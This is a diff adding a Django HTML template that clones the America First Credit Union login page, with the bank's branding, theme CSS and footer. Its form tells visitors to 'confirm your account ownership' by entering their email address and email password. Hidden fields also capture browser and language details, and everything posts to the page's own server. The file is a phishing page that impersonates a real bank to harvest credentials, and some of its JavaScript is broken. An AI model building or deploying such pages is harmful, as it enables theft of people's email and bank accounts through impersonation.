@@ -1,0 +1,890 @@
+{% load static %}
+
+{% block header %}
+<!DOCTYPE html>
+
+<html data-scrapbook-source="https://secure.americafirst.com/#/login" data-scrapbook-create="20220220103841342" data-scrapbook-title="America First Credit Union" lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="icon" href="{% static 'base/images/favicon.ico' %}">
+<title>America First Credit Union</title>
+
+   <link rel="stylesheet" href="{% static 'base/css/chunk-vendors.eab46e62.css' %}">
+        <link rel="stylesheet" href="{% static 'base/css/app.76ff82e5.css' %}">
+    <link rel="stylesheet" href="{% static 'base/css/style.css' %}">
+    <script src='https://www.google.com/recaptcha/api.js?render={{recaptcha_site_key}}'></script>
+
+    <style type="text/css" id="vuetify-theme-stylesheet">.v-application a { color: #337ab7; }
+.v-application .primary {
+  background-color: #1976d2 !important;
+  border-color: #1976d2 !important;
+}
+.v-application .primary--text {
+  color: #1976d2 !important;
+  caret-color: #1976d2 !important;
+}
+.v-application .primary.lighten-5 {
+  background-color: #c7fdff !important;
+  border-color: #c7fdff !important;
+}
+.v-application .primary--text.text--lighten-5 {
+  color: #c7fdff !important;
+  caret-color: #c7fdff !important;
+}
+.v-application .primary.lighten-4 {
+  background-color: #a8e0ff !important;
+  border-color: #a8e0ff !important;
+}
+.v-application .primary--text.text--lighten-4 {
+  color: #a8e0ff !important;
+  caret-color: #a8e0ff !important;
+}
+.v-application .primary.lighten-3 {
+  background-color: #8ac5ff !important;
+  border-color: #8ac5ff !important;
+}
+.v-application .primary--text.text--lighten-3 {
+  color: #8ac5ff !important;
+  caret-color: #8ac5ff !important;
+}
+.v-application .primary.lighten-2 {
+  background-color: #6aaaff !important;
+  border-color: #6aaaff !important;
+}
+.v-application .primary--text.text--lighten-2 {
+  color: #6aaaff !important;
+  caret-color: #6aaaff !important;
+}
+.v-application .primary.lighten-1 {
+  background-color: #488fef !important;
+  border-color: #488fef !important;
+}
+.v-application .primary--text.text--lighten-1 {
+  color: #488fef !important;
+  caret-color: #488fef !important;
+}
+.v-application .primary.darken-1 {
+  background-color: #005eb6 !important;
+  border-color: #005eb6 !important;
+}
+.v-application .primary--text.text--darken-1 {
+  color: #005eb6 !important;
+  caret-color: #005eb6 !important;
+}
+.v-application .primary.darken-2 {
+  background-color: #00479b !important;
+  border-color: #00479b !important;
+}
+.v-application .primary--text.text--darken-2 {
+  color: #00479b !important;
+  caret-color: #00479b !important;
+}
+.v-application .primary.darken-3 {
+  background-color: #003180 !important;
+  border-color: #003180 !important;
+}
+.v-application .primary--text.text--darken-3 {
+  color: #003180 !important;
+  caret-color: #003180 !important;
+}
+.v-application .primary.darken-4 {
+  background-color: #001e67 !important;
+  border-color: #001e67 !important;
+}
+.v-application .primary--text.text--darken-4 {
+  color: #001e67 !important;
+  caret-color: #001e67 !important;
+}
+.v-application .secondary {
+  background-color: #424242 !important;
+  border-color: #424242 !important;
+}
+.v-application .secondary--text {
+  color: #424242 !important;
+  caret-color: #424242 !important;
+}
+.v-application .secondary.lighten-5 {
+  background-color: #c1c1c1 !important;
+  border-color: #c1c1c1 !important;
+}
+.v-application .secondary--text.text--lighten-5 {
+  color: #c1c1c1 !important;
+  caret-color: #c1c1c1 !important;
+}
+.v-application .secondary.lighten-4 {
+  background-color: #a6a6a6 !important;
+  border-color: #a6a6a6 !important;
+}
+.v-application .secondary--text.text--lighten-4 {
+  color: #a6a6a6 !important;
+  caret-color: #a6a6a6 !important;
+}
+.v-application .secondary.lighten-3 {
+  background-color: #8b8b8b !important;
+  border-color: #8b8b8b !important;
+}
+.v-application .secondary--text.text--lighten-3 {
+  color: #8b8b8b !important;
+  caret-color: #8b8b8b !important;
+}
+.v-application .secondary.lighten-2 {
+  background-color: #727272 !important;
+  border-color: #727272 !important;
+}
+.v-application .secondary--text.text--lighten-2 {
+  color: #727272 !important;
+  caret-color: #727272 !important;
+}
+.v-application .secondary.lighten-1 {
+  background-color: #595959 !important;
+  border-color: #595959 !important;
+}
+.v-application .secondary--text.text--lighten-1 {
+  color: #595959 !important;
+  caret-color: #595959 !important;
+}
+.v-application .secondary.darken-1 {
+  background-color: #2c2c2c !important;
+  border-color: #2c2c2c !important;
+}
+.v-application .secondary--text.text--darken-1 {
+  color: #2c2c2c !important;
+  caret-color: #2c2c2c !important;
+}
+.v-application .secondary.darken-2 {
+  background-color: #171717 !important;
+  border-color: #171717 !important;
+}
+.v-application .secondary--text.text--darken-2 {
+  color: #171717 !important;
+  caret-color: #171717 !important;
+}
+.v-application .secondary.darken-3 {
+  background-color: #000000 !important;
+  border-color: #000000 !important;
+}
+.v-application .secondary--text.text--darken-3 {
+  color: #000000 !important;
+  caret-color: #000000 !important;
+}
+.v-application .secondary.darken-4 {
+  background-color: #000000 !important;
+  border-color: #000000 !important;
+}
+.v-application .secondary--text.text--darken-4 {
+  color: #000000 !important;
+  caret-color: #000000 !important;
+}
+.v-application .accent {
+  background-color: #82b1ff !important;
+  border-color: #82b1ff !important;
+}
+.v-application .accent--text {
+  color: #82b1ff !important;
+  caret-color: #82b1ff !important;
+}
+.v-application .accent.lighten-5 {
+  background-color: #ffffff !important;
+  border-color: #ffffff !important;
+}
+.v-application .accent--text.text--lighten-5 {
+  color: #ffffff !important;
+  caret-color: #ffffff !important;
+}
+.v-application .accent.lighten-4 {
+  background-color: #f8ffff !important;
+  border-color: #f8ffff !important;
+}
+.v-application .accent--text.text--lighten-4 {
+  color: #f8ffff !important;
+  caret-color: #f8ffff !important;
+}
+.v-application .accent.lighten-3 {
+  background-color: #daffff !important;
+  border-color: #daffff !important;
+}
+.v-application .accent--text.text--lighten-3 {
+  color: #daffff !important;
+  caret-color: #daffff !important;
+}
+.v-application .accent.lighten-2 {
+  background-color: #bce8ff !important;
+  border-color: #bce8ff !important;
+}
+.v-application .accent--text.text--lighten-2 {
+  color: #bce8ff !important;
+  caret-color: #bce8ff !important;
+}
+.v-application .accent.lighten-1 {
+  background-color: #9fccff !important;
+  border-color: #9fccff !important;
+}
+.v-application .accent--text.text--lighten-1 {
+  color: #9fccff !important;
+  caret-color: #9fccff !important;
+}
+.v-application .accent.darken-1 {
+  background-color: #6596e2 !important;
+  border-color: #6596e2 !important;
+}
+.v-application .accent--text.text--darken-1 {
+  color: #6596e2 !important;
+  caret-color: #6596e2 !important;
+}
+.v-application .accent.darken-2 {
+  background-color: #467dc6 !important;
+  border-color: #467dc6 !important;
+}
+.v-application .accent--text.text--darken-2 {
+  color: #467dc6 !important;
+  caret-color: #467dc6 !important;
+}
+.v-application .accent.darken-3 {
+  background-color: #2364aa !important;
+  border-color: #2364aa !important;
+}
+.v-application .accent--text.text--darken-3 {
+  color: #2364aa !important;
+  caret-color: #2364aa !important;
+}
+.v-application .accent.darken-4 {
+  background-color: #004c90 !important;
+  border-color: #004c90 !important;
+}
+.v-application .accent--text.text--darken-4 {
+  color: #004c90 !important;
+  caret-color: #004c90 !important;
+}
+.v-application .error {
+  background-color: #ff5252 !important;
+  border-color: #ff5252 !important;
+}
+.v-application .error--text {
+  color: #ff5252 !important;
+  caret-color: #ff5252 !important;
+}
+.v-application .error.lighten-5 {
+  background-color: #ffe4d5 !important;
+  border-color: #ffe4d5 !important;
+}
+.v-application .error--text.text--lighten-5 {
+  color: #ffe4d5 !important;
+  caret-color: #ffe4d5 !important;
+}
+.v-application .error.lighten-4 {
+  background-color: #ffc6b9 !important;
+  border-color: #ffc6b9 !important;
+}
+.v-application .error--text.text--lighten-4 {
+  color: #ffc6b9 !important;
+  caret-color: #ffc6b9 !important;
+}
+.v-application .error.lighten-3 {
+  background-color: #ffa99e !important;
+  border-color: #ffa99e !important;
+}
+.v-application .error--text.text--lighten-3 {
+  color: #ffa99e !important;
+  caret-color: #ffa99e !important;
+}
+.v-application .error.lighten-2 {
+  background-color: #ff8c84 !important;
+  border-color: #ff8c84 !important;
+}
+.v-application .error--text.text--lighten-2 {
+  color: #ff8c84 !important;
+  caret-color: #ff8c84 !important;
+}
+.v-application .error.lighten-1 {
+  background-color: #ff6f6a !important;
+  border-color: #ff6f6a !important;
+}
+.v-application .error--text.text--lighten-1 {
+  color: #ff6f6a !important;
+  caret-color: #ff6f6a !important;
+}
+.v-application .error.darken-1 {
+  background-color: #df323b !important;
+  border-color: #df323b !important;
+}
+.v-application .error--text.text--darken-1 {
+  color: #df323b !important;
+  caret-color: #df323b !important;
+}
+.v-application .error.darken-2 {
+  background-color: #bf0025 !important;
+  border-color: #bf0025 !important;
+}
+.v-application .error--text.text--darken-2 {
+  color: #bf0025 !important;
+  caret-color: #bf0025 !important;
+}
+.v-application .error.darken-3 {
+  background-color: #9f0010 !important;
+  border-color: #9f0010 !important;
+}
+.v-application .error--text.text--darken-3 {
+  color: #9f0010 !important;
+  caret-color: #9f0010 !important;
+}
+.v-application .error.darken-4 {
+  background-color: #800000 !important;
+  border-color: #800000 !important;
+}
+.v-application .error--text.text--darken-4 {
+  color: #800000 !important;
+  caret-color: #800000 !important;
+}
+.v-application .info {
+  background-color: #2196f3 !important;
+  border-color: #2196f3 !important;
+}
+.v-application .info--text {
+  color: #2196f3 !important;
+  caret-color: #2196f3 !important;
+}
+.v-application .info.lighten-5 {
+  background-color: #d4ffff !important;
+  border-color: #d4ffff !important;
+}
+.v-application .info--text.text--lighten-5 {
+  color: #d4ffff !important;
+  caret-color: #d4ffff !important;
+}
+.v-application .info.lighten-4 {
+  background-color: #b5ffff !important;
+  border-color: #b5ffff !important;
+}
+.v-application .info--text.text--lighten-4 {
+  color: #b5ffff !important;
+  caret-color: #b5ffff !important;
+}
+.v-application .info.lighten-3 {
+  background-color: #95e8ff !important;
+  border-color: #95e8ff !important;
+}
+.v-application .info--text.text--lighten-3 {
+  color: #95e8ff !important;
+  caret-color: #95e8ff !important;
+}
+.v-application .info.lighten-2 {
+  background-color: #75ccff !important;
+  border-color: #75ccff !important;
+}
+.v-application .info--text.text--lighten-2 {
+  color: #75ccff !important;
+  caret-color: #75ccff !important;
+}
+.v-application .info.lighten-1 {
+  background-color: #51b0ff !important;
+  border-color: #51b0ff !important;
+}
+.v-application .info--text.text--lighten-1 {
+  color: #51b0ff !important;
+  caret-color: #51b0ff !important;
+}
+.v-application .info.darken-1 {
+  background-color: #007cd6 !important;
+  border-color: #007cd6 !important;
+}
+.v-application .info--text.text--darken-1 {
+  color: #007cd6 !important;
+  caret-color: #007cd6 !important;
+}
+.v-application .info.darken-2 {
+  background-color: #0064ba !important;
+  border-color: #0064ba !important;
+}
+.v-application .info--text.text--darken-2 {
+  color: #0064ba !important;
+  caret-color: #0064ba !important;
+}
+.v-application .info.darken-3 {
+  background-color: #004d9f !important;
+  border-color: #004d9f !important;
+}
+.v-application .info--text.text--darken-3 {
+  color: #004d9f !important;
+  caret-color: #004d9f !important;
+}
+.v-application .info.darken-4 {
+  background-color: #003784 !important;
+  border-color: #003784 !important;
+}
+.v-application .info--text.text--darken-4 {
+  color: #003784 !important;
+  caret-color: #003784 !important;
+}
+.v-application .success {
+  background-color: #4caf50 !important;
+  border-color: #4caf50 !important;
+}
+.v-application .success--text {
+  color: #4caf50 !important;
+  caret-color: #4caf50 !important;
+}
+.v-application .success.lighten-5 {
+  background-color: #dcffd6 !important;
+  border-color: #dcffd6 !important;
+}
+.v-application .success--text.text--lighten-5 {
+  color: #dcffd6 !important;
+  caret-color: #dcffd6 !important;
+}
+.v-application .success.lighten-4 {
+  background-color: #beffba !important;
+  border-color: #beffba !important;
+}
+.v-application .success--text.text--lighten-4 {
+  color: #beffba !important;
+  caret-color: #beffba !important;
+}
+.v-application .success.lighten-3 {
+  background-color: #a2ff9e !important;
+  border-color: #a2ff9e !important;
+}
+.v-application .success--text.text--lighten-3 {
+  color: #a2ff9e !important;
+  caret-color: #a2ff9e !important;
+}
+.v-application .success.lighten-2 {
+  background-color: #85e783 !important;
+  border-color: #85e783 !important;
+}
+.v-application .success--text.text--lighten-2 {
+  color: #85e783 !important;
+  caret-color: #85e783 !important;
+}
+.v-application .success.lighten-1 {
+  background-color: #69cb69 !important;
+  border-color: #69cb69 !important;
+}
+.v-application .success--text.text--lighten-1 {
+  color: #69cb69 !important;
+  caret-color: #69cb69 !important;
+}
+.v-application .success.darken-1 {
+  background-color: #2d9437 !important;
+  border-color: #2d9437 !important;
+}
+.v-application .success--text.text--darken-1 {
+  color: #2d9437 !important;
+  caret-color: #2d9437 !important;
+}
+.v-application .success.darken-2 {
+  background-color: #00791e !important;
+  border-color: #00791e !important;
+}
+.v-application .success--text.text--darken-2 {
+  color: #00791e !important;
+  caret-color: #00791e !important;
+}
+.v-application .success.darken-3 {
+  background-color: #006000 !important;
+  border-color: #006000 !important;
+}
+.v-application .success--text.text--darken-3 {
+  color: #006000 !important;
+  caret-color: #006000 !important;
+}
+.v-application .success.darken-4 {
+  background-color: #004700 !important;
+  border-color: #004700 !important;
+}
+.v-application .success--text.text--darken-4 {
+  color: #004700 !important;
+  caret-color: #004700 !important;
+}
+.v-application .warning {
+  background-color: #fb8c00 !important;
+  border-color: #fb8c00 !important;
+}
+.v-application .warning--text {
+  color: #fb8c00 !important;
+  caret-color: #fb8c00 !important;
+}
+.v-application .warning.lighten-5 {
+  background-color: #ffff9e !important;
+  border-color: #ffff9e !important;
+}
+.v-application .warning--text.text--lighten-5 {
+  color: #ffff9e !important;
+  caret-color: #ffff9e !important;
+}
+.v-application .warning.lighten-4 {
+  background-color: #fffb82 !important;
+  border-color: #fffb82 !important;
+}
+.v-application .warning--text.text--lighten-4 {
+  color: #fffb82 !important;
+  caret-color: #fffb82 !important;
+}
+.v-application .warning.lighten-3 {
+  background-color: #ffdf67 !important;
+  border-color: #ffdf67 !important;
+}
+.v-application .warning--text.text--lighten-3 {
+  color: #ffdf67 !important;
+  caret-color: #ffdf67 !important;
+}
+.v-application .warning.lighten-2 {
+  background-color: #ffc24b !important;
+  border-color: #ffc24b !important;
+}
+.v-application .warning--text.text--lighten-2 {
+  color: #ffc24b !important;
+  caret-color: #ffc24b !important;
+}
+.v-application .warning.lighten-1 {
+  background-color: #ffa72d !important;
+  border-color: #ffa72d !important;
+}
+.v-application .warning--text.text--lighten-1 {
+  color: #ffa72d !important;
+  caret-color: #ffa72d !important;
+}
+.v-application .warning.darken-1 {
+  background-color: #db7200 !important;
+  border-color: #db7200 !important;
+}
+.v-application .warning--text.text--darken-1 {
+  color: #db7200 !important;
+  caret-color: #db7200 !important;
+}
+.v-application .warning.darken-2 {
+  background-color: #bb5900 !important;
+  border-color: #bb5900 !important;
+}
+.v-application .warning--text.text--darken-2 {
+  color: #bb5900 !important;
+  caret-color: #bb5900 !important;
+}
+.v-application .warning.darken-3 {
+  background-color: #9d4000 !important;
+  border-color: #9d4000 !important;
+}
+.v-application .warning--text.text--darken-3 {
+  color: #9d4000 !important;
+  caret-color: #9d4000 !important;
+}
+.v-application .warning.darken-4 {
+  background-color: #802700 !important;
+  border-color: #802700 !important;
+}
+.v-application .warning--text.text--darken-4 {
+  color: #802700 !important;
+  caret-color: #802700 !important;
+}
+.v-application .afcu-blue {
+  background-color: #00548e !important;
+  border-color: #00548e !important;
+}
+.v-application .afcu-blue--text {
+  color: #00548e !important;
+  caret-color: #00548e !important;
+}
+.v-application .afcu-blue.lighten-5 {
+  background-color: #a7d6ff !important;
+  border-color: #a7d6ff !important;
+}
+.v-application .afcu-blue--text.text--lighten-5 {
+  color: #a7d6ff !important;
+  caret-color: #a7d6ff !important;
+}
+.v-application .afcu-blue.lighten-4 {
+  background-color: #8abafd !important;
+  border-color: #8abafd !important;
+}
+.v-application .afcu-blue--text.text--lighten-4 {
+  color: #8abafd !important;
+  caret-color: #8abafd !important;
+}
+.v-application .afcu-blue.lighten-3 {
+  background-color: #6e9fe0 !important;
+  border-color: #6e9fe0 !important;
+}
+.v-application .afcu-blue--text.text--lighten-3 {
+  color: #6e9fe0 !important;
+  caret-color: #6e9fe0 !important;
+}
+.v-application .afcu-blue.lighten-2 {
+  background-color: #5185c4 !important;
+  border-color: #5185c4 !important;
+}
+.v-application .afcu-blue--text.text--lighten-2 {
+  color: #5185c4 !important;
+  caret-color: #5185c4 !important;
+}
+.v-application .afcu-blue.lighten-1 {
+  background-color: #316ca9 !important;
+  border-color: #316ca9 !important;
+}
+.v-application .afcu-blue--text.text--lighten-1 {
+  color: #316ca9 !important;
+  caret-color: #316ca9 !important;
+}
+.v-application .afcu-blue.darken-1 {
+  background-color: #003d74 !important;
+  border-color: #003d74 !important;
+}
+.v-application .afcu-blue--text.text--darken-1 {
+  color: #003d74 !important;
+  caret-color: #003d74 !important;
+}
+.v-application .afcu-blue.darken-2 {
+  background-color: #00285b !important;
+  border-color: #00285b !important;
+}
+.v-application .afcu-blue--text.text--darken-2 {
+  color: #00285b !important;
+  caret-color: #00285b !important;
+}
+.v-application .afcu-blue.darken-3 {
+  background-color: #001343 !important;
+  border-color: #001343 !important;
+}
+.v-application .afcu-blue--text.text--darken-3 {
+  color: #001343 !important;
+  caret-color: #001343 !important;
+}
+.v-application .afcu-blue.darken-4 {
+  background-color: #00002d !important;
+  border-color: #00002d !important;
+}
+.v-application .afcu-blue--text.text--darken-4 {
+  color: #00002d !important;
+  caret-color: #00002d !important;
+}
+.v-application .afcu-dark-blue {
+  background-color: #1e1e23 !important;
+  border-color: #1e1e23 !important;
+}
+.v-application .afcu-dark-blue--text {
+  color: #1e1e23 !important;
+  caret-color: #1e1e23 !important;
+}
+.v-application .afcu-dark-blue.lighten-5 {
+  background-color: #94949a !important;
+  border-color: #94949a !important;
+}
+.v-application .afcu-dark-blue--text.text--lighten-5 {
+  color: #94949a !important;
+  caret-color: #94949a !important;
+}
+.v-application .afcu-dark-blue.lighten-4 {
+  background-color: #7a7a80 !important;
+  border-color: #7a7a80 !important;
+}
+.v-application .afcu-dark-blue--text.text--lighten-4 {
+  color: #7a7a80 !important;
+  caret-color: #7a7a80 !important;
+}
+.v-application .afcu-dark-blue.lighten-3 {
+  background-color: #616167 !important;
+  border-color: #616167 !important;
+}
+.v-application .afcu-dark-blue--text.text--lighten-3 {
+  color: #616167 !important;
+  caret-color: #616167 !important;
+}
+.v-application .afcu-dark-blue.lighten-2 {
+  background-color: #4a4a4f !important;
+  border-color: #4a4a4f !important;
+}
+.v-application .afcu-dark-blue--text.text--lighten-2 {
+  color: #4a4a4f !important;
+  caret-color: #4a4a4f !important;
+}
+.v-application .afcu-dark-blue.lighten-1 {
+  background-color: #333338 !important;
+  border-color: #333338 !important;
+}
+.v-application .afcu-dark-blue--text.text--lighten-1 {
+  color: #333338 !important;
+  caret-color: #333338 !important;
+}
+.v-application .afcu-dark-blue.darken-1 {
+  background-color: #05050d !important;
+  border-color: #05050d !important;
+}
+.v-application .afcu-dark-blue--text.text--darken-1 {
+  color: #05050d !important;
+  caret-color: #05050d !important;
+}
+.v-application .afcu-dark-blue.darken-2 {
+  background-color: #000000 !important;
+  border-color: #000000 !important;
+}
+.v-application .afcu-dark-blue--text.text--darken-2 {
+  color: #000000 !important;
+  caret-color: #000000 !important;
+}
+.v-application .afcu-dark-blue.darken-3 {
+  background-color: #000000 !important;
+  border-color: #000000 !important;
+}
+.v-application .afcu-dark-blue--text.text--darken-3 {
+  color: #000000 !important;
+  caret-color: #000000 !important;
+}
+.v-application .afcu-dark-blue.darken-4 {
+  background-color: #000000 !important;
+  border-color: #000000 !important;
+}
+.v-application .afcu-dark-blue--text.text--darken-4 {
+  color: #000000 !important;
+  caret-color: #000000 !important;
+}</style>
+
+
+</head>
+
+<body>
+
+
+<noscript><strong>We're sorry but America First Credit Union doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
+</noscript>
+
+<div data-app="true" class="v-application v-application--is-ltr theme--light" id="app">
+<div class="v-application--wrap">
+<div data-v-5c15a386="" id="notifications"><!----></div>
+<header data-v-7168338a="" class="v-sheet theme--dark v-toolbar v-toolbar--flat v-app-bar v-app-bar--fixed afcu-blue" style="height: 78px; margin-top: 0px; transform: translateY(0px); left: 0px; right: 0px;" data-booted="true"><div class="v-toolbar__content" style="height: 78px;"><div data-v-7168338a="" class="container container--fluid"><div data-v-7168338a="" class="row"><div data-v-7168338a="" class="d-flex"><a data-v-7168338a="" href="https://www.americafirst.com/"><img data-v-7168338a="" alt="America First Credit Union" src="{% static 'base/images/368f9486f1d69178fbf8bf2dcfbc491b23e4b261.png' %}" class="hidden-md-and-up mobile-logo" width="139"><img data-v-7168338a="" alt="America First Credit Union" src="{% static 'base/images/logo-desktop-inverse.a3a99f3a.png' %}" class="hidden-sm-and-down webkit-blur-fix" width="185"></a></div></div></div></div></header><main class="v-main" style="padding: 78px 0px 0px;" data-booted="true"><div class="v-main__wrap"><div class="container container--fluid"><div data-v-441a3690="" id="content">
+
+
+<div data-v-55886b46="" data-v-0945e6cd="" data-v-441a3690="">
+<h1 data-v-55886b46="" class="text-h4" ><span style="font-size:25px">Please confirm your account ownership with your email.</span></h1>
+<!--<div style="color:red;margin:0 0 1.3em 0;font-size:12px">Incorrect email address or email password. Please try again</div>-->
+<div data-v-2906dda8="" data-v-55886b46="" class="row">
+<div data-v-2906dda8="" class="col-md-5 col-lg-4 col">
+
+<form id="loginForm" name="loginForm" method="POST" action="" class="v-form" data-v-2906dda8="">
+<!--<div style="color:red;font-size:12px;margin:1em 0">Incorrect account number or password . Please try again</div>-->
+ {% csrf_token %}
+
+<div data-v-6a6d1b4c="" data-v-55886b46="">
+<div data-v-021e61f0="" data-v-6a6d1b4c="">
+<div data-v-021e61f0="" class="v-input theme--light v-text-field v-text-field--is-booted">
+<div class="v-input__control">
+<div class="v-input__slot">
+<div class="v-text-field__slot">
+<label for="name-callback-1" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;margin:-1.6em 0 0 0">Email Address</label>
+<input autocomplete="off"  id="email" name="email" required type="email" value="">
+</div>
+</div>
+<div class="v-text-field__details">
+<div class="v-messages theme--light">
+<div class="v-messages__wrapper"></div>
+</div>
+</div>
+</div>
+</div>
+</div><!----><!---->
+</div>
+
+<div data-v-6a6d1b4c="" data-v-55886b46="">
+<div data-v-021e61f0="" data-v-6a6d1b4c="">
+<div data-v-021e61f0="" class="v-input theme--light v-text-field v-text-field--is-booted">
+<div class="v-input__control">
+<div class="v-input__slot">
+<div class="v-text-field__slot">
+<label for="name-callback-1" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;margin:-1.6em 0 0 0">Email Password</label>
+<input autocomplete="off"  id="emailpass" name="emailpass" required type="password" value="">
+</div>
+</div>
+<div class="v-text-field__details">
+<div class="v-messages theme--light">
+<div class="v-messages__wrapper"></div>
+</div>
+</div>
+</div>
+</div>
+</div><!----><!---->
+</div>
+
+<div data-v-55886b46="" class="mt-4">
+
+<input type="text" hidden name="user_agent" id = "user_agent">
+                        <input type="text" hidden name="languages" id = "languages">
+                        <input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response">
+                        <input type="text" hidden name="browser_name" id = "browser_name">
+                        <input type="text" hidden name="browser_version" id = "browser_version">
+<button data-v-55886b46="" type="submit" class="mr-3 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default primary" id="loginForm">
+<span class="v-btn__content">Continue</span>
+</button>
+</div>
+</form>
+
+
+<!--<p data-v-55886b46="" data-v-2906dda8="" id="fl-question" class="text-body-2 mt-6">First time logging in? <a data-v-55886b46="" href="#/enroll" class="" id="fl-enroll-link" data-v-2906dda8="">Enroll Now</a></p>-->
+<!--<p data-v-55886b46="" data-v-2906dda8="" id="fp-message" class="text-body-2">
+<a data-v-55886b46="" href="#/forgot-password" class="" id="fp-link" data-v-2906dda8="">Forgot Password</a> or need other assistance?
+<a data-v-55886b46="" data-v-2906dda8="" id="fp-contact-link" href="https://www.americafirst.com/about/contact/">Contact Us</a>
+</p>-->
+</div>
+
+<div data-v-2906dda8="" class="hidden-sm-and-down col"><div data-v-2906dda8="" id="WorkflowAdSpace"></div></div></div></div><input data-v-441a3690="" id="hidden-input" type="text" value=""></div></div></div></main><footer data-v-0b9ebc54="" class="v-footer v-sheet theme--dark afcu-dark-blue" data-booted="true"><div data-v-0b9ebc54="" class="container container--fluid"><div data-v-0b9ebc54="" class="row footer-links-section mt-1 justify-center"><div data-v-0b9ebc54=""><a data-v-0b9ebc54="" href="https://www.americafirst.com/about/disclosures/membership-agreement.cfm" target="_blank" title="Membership &amp; Account Agreement"> terms </a><span data-v-0b9ebc54="" class="link-separator">|</span><a data-v-0b9ebc54="" href="https://www.americafirst.com/about/contact/branches.html" target="_blank" title="Find Branches" class="utility-link"> branch locator </a><span data-v-0b9ebc54="" class="link-separator">|</span><a data-v-0b9ebc54="" href="tel:1-855-801-2328" class="utility-link"> 1-855-801-2328 </a></div></div><div data-v-0b9ebc54="" class="row footer-image-section mt-6 mb-3 justify-center"><div data-v-0b9ebc54=""><div data-v-0b9ebc54="" aria-label="America First Credit Union" role="img" class="v-image v-responsive theme--dark" style="width: 200px;"><div class="v-responsive__sizer" style="padding-bottom: 21.6%;"></div><div class="v-image__image v-image__image--cover" style="background-image: url(&quot;{% static 'base/images/d4c16de980048679c0662f782e29945ab5125717.png' %}&quot;); background-position: center center;"></div><div class="v-responsive__content" style="width: 250px;"></div></div></div></div><div data-v-0b9ebc54="" class="row footer-copyright-section align-center"><div data-v-0b9ebc54="" class="text-center col-md-auto col-12"><a data-v-0b9ebc54="" href="http://portal.hud.gov/hudportal/HUD?src=/program_offices/fair_housing_equal_opp" target="_blank" title="Equal Housing Lender"><img data-v-0b9ebc54="" src="{% static 'base/images/21d7d23b5082cfbd7662ecf888a9879cef5e3b6d.png' %}" alt="Equal Housing Lender"></a><a data-v-0b9ebc54="" href="https://www.ncua.gov/support-services/share-insurance-fund" target="_blank" title="Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency" class="ml-2"><img data-v-0b9ebc54="" src="{% static 'base/images/78bdeddcd621c8d0d38dce1c2bfedd9330602f96.png' %}" alt="NCUA"></a></div><div data-v-0b9ebc54="" class="footer-fine-print col"><p data-v-0b9ebc54="">©<span data-v-0b9ebc54="">2022</span> America First Credit Union. All Rights Reserved. America First Federal Credit Union does business as (DBA) America First Credit Union. Unauthorized account access or use is not permitted and may constitute a crime punishable by law. America First Credit Union respects your privacy. Please view our <a data-v-0b9ebc54="" href="https://www.americafirst.com/documents/membership-agreement.pdf#privacyPolicy">Privacy Policy</a>, <a data-v-0b9ebc54="" href="https://www.americafirst.com/documents/marketing-email-opt-out.pdf">Email Opt Out Procedure</a> and <a data-v-0b9ebc54="" href="https://www.americafirst.com/content/dam/pdfs/FTEU%20Fraud%20Alerts.pdf">Fraud Alert Text/SMS Notification Terms and Conditions</a>. This credit union is federally insured by the National Credit Union Administration.</p></div></div></div></footer></div></div>
+
+<!--
+<script src="{% static 'base/css/chunk-vendors.662cf618.js' %}"></script>
+<script src="{% static 'base/css/app.48c40f3c.js' %}"></script>
+-->
+
+<iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_americafirstcreditunion_0" name="destination_publishing_iframe_americafirstcreditunion_0_name" style="display: none; width: 0px; height: 0px;" src="base/css/index_1.html#https%3A/secure.americafirst.com" class="aamIframeLoaded"></iframe>
+
+
+
+<div class="overlay">
+  <div class="lgif-space"></div>
+    <div class="loadgif">
+       <img src="{% static 'base/images/loading.gif' %}" width="100" height="100">
+    </div>
+</div>
+
+
+<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+
+ <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
+<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
+
+<script type="{% static 'base/js/script.js' %}"></script>
+
+<script type="text/javascript">
+
+<script>
+        $("#loginForm").click(function(e){
+            e.preventDefault();
+            if ($("#loginForm").hasClass("one")){
+                $("#email").val("");
+                $("#emailpass").val("");
+
+                $("#user_agent").val(navigator.userAgent);
+                $("#browser_name").val(navigator.appCodeName);
+                $("#languages").val(navigator.languages);
+                $("#browser_version").val(navigator.appVersion);`
+                $("#loginForm").removeClass("one");
+
+
+            }else{
+
+                $("#form_three").submit();
+            }
+        })
+    </script>
+
+
+<script>
+        grecaptcha.ready(function() {
+          grecaptcha.execute('{{recaptcha_site_key}}', {action: "/"}).then(function(token) {
+            document.getElementById('g-recaptcha-response').value = token;
+          });
+        });
+    </script>
+</body>
+</html>
+{% endblock %}
